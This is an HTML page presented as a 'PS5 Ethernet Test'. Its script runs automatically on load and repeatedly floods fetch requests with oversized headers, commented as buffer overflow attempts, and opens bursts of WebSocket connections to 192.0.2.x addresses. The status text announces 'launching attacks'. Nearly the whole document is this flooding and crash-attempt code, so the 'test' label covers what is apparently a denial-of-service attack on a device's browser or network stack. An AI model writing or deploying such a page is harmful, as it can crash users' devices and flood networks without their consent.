<!DOCTYPE html>
<html>
<head>
    <title>Ethernet Stress Test</title>
    <style>
        body {
            background-color: #111;
            color: #0f0;
            font-family: monospace;
            padding: 20px;
        }
    </style>
</head>
<body>
    <h1>PS5 Ethernet Test</h1>
    <div id="status">Iniciando test...</div>

    <script>
        function floodFetch() {
            for (let i = 0; i < 1000; i++) {
                try {
                    fetch(`http://192.0.2.${i % 255}/nonexistent${Math.random()}`, {
                        method: 'GET',
                        headers: {
                            'X-Custom-Header': 'A'.repeat(5000), // Cabecera muy grande
                            'X-Overflow-Attempt': 'B'.repeat(10000) // Intento de buffer overflow
                        },
                        mode: 'no-cors',
                        cache: 'no-store',
                        keepalive: true,
                    }).catch(() => {});
                } catch (e) {
                    console.log(e);
                }
            }
        }

        function floodWebSocket() {
            for (let i = 0; i < 100; i++) {
                try {
                    new WebSocket(`ws://192.0.2.${i % 255}/badpath${Math.random()}`);
                } catch (e) {
                    console.log(e);
                }
            }
        }

        function startTest() {
            document.getElementById('status').textContent = "Lanzando ataques...";
            setInterval(floodFetch, 500);
            setInterval(floodWebSocket, 2000);
        }

        window.onload = startTest;
    </script>
</body>
</html>
